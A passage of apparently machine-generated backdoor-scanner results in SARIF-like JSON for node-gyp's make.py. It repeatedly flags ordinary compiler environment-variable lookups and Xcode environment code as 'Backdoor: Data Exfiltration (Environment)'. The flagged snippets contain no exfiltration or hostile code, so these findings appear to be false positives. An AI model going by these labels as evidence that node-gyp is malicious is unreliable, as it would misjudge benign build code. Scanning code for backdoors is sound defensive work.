                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 62,
                  "endLine": 15,
                  "snippet": {
                    "text": "# The code below generates a separate .mk file for each target, but\n# all are sourced by the top-level Makefile.  This means that all\n# variables in .mk-files clobber one another.  Be careful to use :=\n# where appropriate for immediate evaluation, and similarly to watch\n# that you're not relying on a variable value to last between different\n# .mk files.\n#\n# TODOs:\n",
                    "rendered": {
                      "text": "# The code below generates a separate .mk file for each target, but\n# all are sourced by the top-level Makefile.  This means that all\n# variables in .mk-files clobber one another.  Be careful to use :=\n# where appropriate for immediate evaluation, and similarly to watch\n# that you're not relying on a variable value to last between different\n# .mk files.\n#\n# TODOs:\n",
                      "markdown": "`# The code below generates a separate .mk file for each target, but\n# all are sourced by the top-level Makefile.  This means that all\n# variables in .mk-files clobber one another.  Be careful to use :=\n# where appropriate for immediate evaluation, and similarly to watch\n# that you're not relying on a variable value to last between different\n# .mk files.\n#\n# TODOs:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2532,
                  "startColumn": 28,
                  "endLine": 2532,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            # Node.js versions prior to v18:\n            makedep_arguments = \"-qmakedep=gcc\"\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"njsc\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"njsc++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"njsc++\")\n        header_params.update(\n            {\n",
                    "rendered": {
                      "text": "            # Node.js versions prior to v18:\n            makedep_arguments = \"-qmakedep=gcc\"\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"njsc\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"njsc++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"njsc++\")\n        header_params.update(\n            {\n",
                      "markdown": "`            # Node.js versions prior to v18:\n            makedep_arguments = \"-qmakedep=gcc\"\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"njsc\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"njsc++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"njsc++\")\n        header_params.update(\n            {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2526,
                  "startColumn": 28,
                  "endLine": 2526,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++64\")\n        elif CC_target == \"ibm-clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"ibm-clang++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++\")\n        else:\n            # Node.js versions prior to v18:\n",
                    "rendered": {
                      "text": "            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++64\")\n        elif CC_target == \"ibm-clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"ibm-clang++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++\")\n        else:\n            # Node.js versions prior to v18:\n",
                      "markdown": "`            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++64\")\n        elif CC_target == \"ibm-clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"ibm-clang++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++\")\n        else:\n            # Node.js versions prior to v18:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2522,
                  "startColumn": 28,
                  "endLine": 2522,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"clang++\")\n        elif CC_target == \"ibm-clang64\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang64\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"ibm-clang++64\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++64\")\n        elif CC_target == \"ibm-clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang\")\n",
                    "rendered": {
                      "text": "            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"clang++\")\n        elif CC_target == \"ibm-clang64\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang64\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"ibm-clang++64\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++64\")\n        elif CC_target == \"ibm-clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang\")\n",
                      "markdown": "`            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"clang++\")\n        elif CC_target == \"ibm-clang64\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang64\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"ibm-clang++64\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"ibm-clang++64\")\n        elif CC_target == \"ibm-clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2518,
                  "startColumn": 28,
                  "endLine": 2518,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        makedep_arguments = \"-MMD\"\n        if CC_target == \"clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"clang\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"clang++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"clang++\")\n        elif CC_target == \"ibm-clang64\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang64\")\n",
                    "rendered": {
                      "text": "        makedep_arguments = \"-MMD\"\n        if CC_target == \"clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"clang\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"clang++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"clang++\")\n        elif CC_target == \"ibm-clang64\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang64\")\n",
                      "markdown": "`        makedep_arguments = \"-MMD\"\n        if CC_target == \"clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"clang\")\n            CXX_target = GetEnvironFallback((\"CXX_target\", \"CXX\"), \"clang++\")\n            CXX_host = GetEnvironFallback((\"CXX_host\", \"CXX\"), \"clang++\")\n        elif CC_target == \"ibm-clang64\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"ibm-clang64\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2514,
                  "startColumn": 23,
                  "endLine": 2514,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        header_params.update({\"link_commands\": LINK_COMMANDS_ANDROID})\n    elif flavor == \"zos\":\n        copy_archive_arguments = \"-fPR\"\n        CC_target = GetEnvironFallback((\"CC_target\", \"CC\"), \"njsc\")\n        makedep_arguments = \"-MMD\"\n        if CC_target == \"clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"clang\")\n",
                    "rendered": {
                      "text": "        header_params.update({\"link_commands\": LINK_COMMANDS_ANDROID})\n    elif flavor == \"zos\":\n        copy_archive_arguments = \"-fPR\"\n        CC_target = GetEnvironFallback((\"CC_target\", \"CC\"), \"njsc\")\n        makedep_arguments = \"-MMD\"\n        if CC_target == \"clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"clang\")\n",
                      "markdown": "`        header_params.update({\"link_commands\": LINK_COMMANDS_ANDROID})\n    elif flavor == \"zos\":\n        copy_archive_arguments = \"-fPR\"\n        CC_target = GetEnvironFallback((\"CC_target\", \"CC\"), \"njsc\")\n        makedep_arguments = \"-MMD\"\n        if CC_target == \"clang\":\n            CC_host = GetEnvironFallback((\"CC_host\", \"CC\"), \"clang\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2471,
                  "startColumn": 32,
                  "endLine": 2471,
                  "endColumn": 60,
                  "snippet": {
                    "text": "    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n    AR_host = replace_sep(GetEnvironFallback((\"AR_host\", \"AR\"), \"ar\"))\n    CXX_host = replace_sep(GetEnvironFallback((\"CXX_host\", \"CXX\"), \"g++\"))\n",
                    "rendered": {
                      "text": "    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n    AR_host = replace_sep(GetEnvironFallback((\"AR_host\", \"AR\"), \"ar\"))\n    CXX_host = replace_sep(GetEnvironFallback((\"CXX_host\", \"CXX\"), \"g++\"))\n",
                      "markdown": "`    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n    AR_host = replace_sep(GetEnvironFallback((\"AR_host\", \"AR\"), \"ar\"))\n    CXX_host = replace_sep(GetEnvironFallback((\"CXX_host\", \"CXX\"), \"g++\"))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2470,
                  "startColumn": 33,
                  "endLine": 2470,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n    AR_host = replace_sep(GetEnvironFallback((\"AR_host\", \"AR\"), \"ar\"))\n",
                    "rendered": {
                      "text": "    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n    AR_host = replace_sep(GetEnvironFallback((\"AR_host\", \"AR\"), \"ar\"))\n",
                      "markdown": "`    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n    AR_host = replace_sep(GetEnvironFallback((\"AR_host\", \"AR\"), \"ar\"))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2469,
                  "startColumn": 32,
                  "endLine": 2469,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n",
                    "rendered": {
                      "text": "\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n",
                      "markdown": "`\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n    CC_host = replace_sep(GetEnvironFallback((\"CC_host\", \"CC\"), \"gcc\"))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2468,
                  "startColumn": 31,
                  "endLine": 2468,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        )\n\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n",
                    "rendered": {
                      "text": "        )\n\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n",
                      "markdown": "`        )\n\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n    PLI_target = replace_sep(GetEnvironFallback((\"PLI_target\", \"PLI\"), \"pli\"))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2467,
                  "startColumn": 31,
                  "endLine": 2467,
                  "endColumn": 58,
                  "snippet": {
                    "text": "            ' -Wl,--end-group', ''\n        )\n\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n",
                    "rendered": {
                      "text": "            ' -Wl,--end-group', ''\n        )\n\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n",
                      "markdown": "`            ' -Wl,--end-group', ''\n        )\n\n    CC_target = replace_sep(GetEnvironFallback((\"CC_target\", \"CC\"), \"$(CC)\"))\n    AR_target = replace_sep(GetEnvironFallback((\"AR_target\", \"AR\"), \"$(AR)\"))\n    CXX_target = replace_sep(GetEnvironFallback((\"CXX_target\", \"CXX\"), \"$(CXX)\"))\n    LINK_target = replace_sep(GetEnvironFallback((\"LINK_target\", \"LINK\"), \"$(LINK)\"))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2299,
                  "startColumn": 24,
                  "endLine": 2299,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            additional_settings={\"CHROMIUM_STRIP_SAVE_FILE\": strip_save_file}\n        )\n\n    def WriteSortedXcodeEnv(self, target, env):\n        for k, v in env:\n            # For\n            #  foo := a\\ b\n",
                    "rendered": {
                      "text": "            additional_settings={\"CHROMIUM_STRIP_SAVE_FILE\": strip_save_file}\n        )\n\n    def WriteSortedXcodeEnv(self, target, env):\n        for k, v in env:\n            # For\n            #  foo := a\\ b\n",
                      "markdown": "`            additional_settings={\"CHROMIUM_STRIP_SAVE_FILE\": strip_save_file}\n        )\n\n    def WriteSortedXcodeEnv(self, target, env):\n        for k, v in env:\n            # For\n            #  foo := a\\ b\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1780,
                  "startColumn": 33,
                  "endLine": 1780,
                  "endColumn": 73,
                  "snippet": {
                    "text": "            # Envvars may be referenced by TARGET_POSTBUILDS_$(BUILDTYPE),\n            # so we must output its definition first, since we declare variables\n            # using \":=\".\n            self.WriteSortedXcodeEnv(self.output, self.GetSortedXcodePostbuildEnv())\n\n            for configname in target_postbuilds:\n                self.WriteLn(\n",
                    "rendered": {
                      "text": "            # Envvars may be referenced by TARGET_POSTBUILDS_$(BUILDTYPE),\n            # so we must output its definition first, since we declare variables\n            # using \":=\".\n            self.WriteSortedXcodeEnv(self.output, self.GetSortedXcodePostbuildEnv())\n\n            for configname in target_postbuilds:\n                self.WriteLn(\n",
                      "markdown": "`            # Envvars may be referenced by TARGET_POSTBUILDS_$(BUILDTYPE),\n            # so we must output its definition first, since we declare variables\n            # using \":=\".\n            self.WriteSortedXcodeEnv(self.output, self.GetSortedXcodePostbuildEnv())\n\n            for configname in target_postbuilds:\n                self.WriteLn(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1777,
                  "startColumn": 14,
                  "endLine": 1777,
                  "endColumn": 54,
                  "snippet": {
                    "text": "            postbuilds.extend(gyp.xcode_emulation.GetSpecPostbuildCommands(spec))\n\n        if postbuilds:\n            # Envvars may be referenced by TARGET_POSTBUILDS_$(BUILDTYPE),\n            # so we must output its definition first, since we declare variables\n            # using \":=\".\n            self.WriteSortedXcodeEnv(self.output, self.GetSortedXcodePostbuildEnv())\n",
                    "rendered": {
                      "text": "            postbuilds.extend(gyp.xcode_emulation.GetSpecPostbuildCommands(spec))\n\n        if postbuilds:\n            # Envvars may be referenced by TARGET_POSTBUILDS_$(BUILDTYPE),\n            # so we must output its definition first, since we declare variables\n            # using \":=\".\n            self.WriteSortedXcodeEnv(self.output, self.GetSortedXcodePostbuildEnv())\n",
                      "markdown": "`            postbuilds.extend(gyp.xcode_emulation.GetSpecPostbuildCommands(spec))\n\n        if postbuilds:\n            # Envvars may be referenced by TARGET_POSTBUILDS_$(BUILDTYPE),\n            # so we must output its definition first, since we declare variables\n            # using \":=\".\n            self.WriteSortedXcodeEnv(self.output, self.GetSortedXcodePostbuildEnv())\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1338,
                  "startColumn": 40,
                  "endLine": 1338,
                  "endColumn": 69,
                  "snippet": {
                    "text": "\n    def WriteMacInfoPlist(self, bundle_deps):\n        \"\"\"Write Makefile code for bundle Info.plist files.\"\"\"\n        info_plist, out, defines, extra_env = gyp.xcode_emulation.GetMacInfoPlist(\n            generator_default_variables[\"PRODUCT_DIR\"],\n            self.xcode_settings,\n            lambda p: Sourceify(self.Absolutify(p)),\n",
                    "rendered": {
                      "text": "\n    def WriteMacInfoPlist(self, bundle_deps):\n        \"\"\"Write Makefile code for bundle Info.plist files.\"\"\"\n        info_plist, out, defines, extra_env = gyp.xcode_emulation.GetMacInfoPlist(\n            generator_default_variables[\"PRODUCT_DIR\"],\n            self.xcode_settings,\n            lambda p: Sourceify(self.Absolutify(p)),\n",
                      "markdown": "`\n    def WriteMacInfoPlist(self, bundle_deps):\n        \"\"\"Write Makefile code for bundle Info.plist files.\"\"\"\n        info_plist, out, defines, extra_env = gyp.xcode_emulation.GetMacInfoPlist(\n            generator_default_variables[\"PRODUCT_DIR\"],\n            self.xcode_settings,\n            lambda p: Sourceify(self.Absolutify(p)),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1308,
                  "startColumn": 16,
                  "endLine": 1308,
                  "endColumn": 30,
                  "snippet": {
